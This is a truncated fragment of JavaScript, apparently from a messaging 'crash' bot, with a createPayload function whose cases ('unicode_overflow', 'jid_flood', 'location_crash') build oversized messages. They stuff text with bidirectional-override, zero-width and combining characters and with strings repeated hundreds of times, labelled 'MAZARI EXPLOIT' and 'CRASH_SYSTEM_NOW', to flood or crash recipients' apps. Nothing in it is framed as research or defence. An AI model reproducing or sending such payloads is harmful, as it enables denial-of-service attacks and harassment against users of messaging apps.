            ...
            const createPayload = (type) => {
                ...
                switch (type) {
                    case 'unicode_overflow':
                        ...
                        const rtl = '\u200E\u200F\u202A\u202B\u202C\u202D\u202E';
                        const zwj = '\u200B\u200C\u200D\uFEFF';
                        const exotic = '҉'.repeat(10);
                        const base = (rtl + zwj + exotic).repeat(100);
                    ...
                    case 'jid_flood':
                        ...
                        payload = { 
                            text: '☠️ ' + '\u200D'.repeat(1000) + ' SYSTEM OVERLOAD ' + '\u200D'.repeat(1000) + ' ☠️',
                            mentions: mentions
                        };
                        break;
                    ...
                    case 'location_crash':
                        ...
                        payload = {
                            location: {
                                ...
                                name: '☣️ MAZARI EXPLOIT ☣️'.repeat(500),
                                address: 'CRASH_SYSTEM_NOW'.repeat(1000),
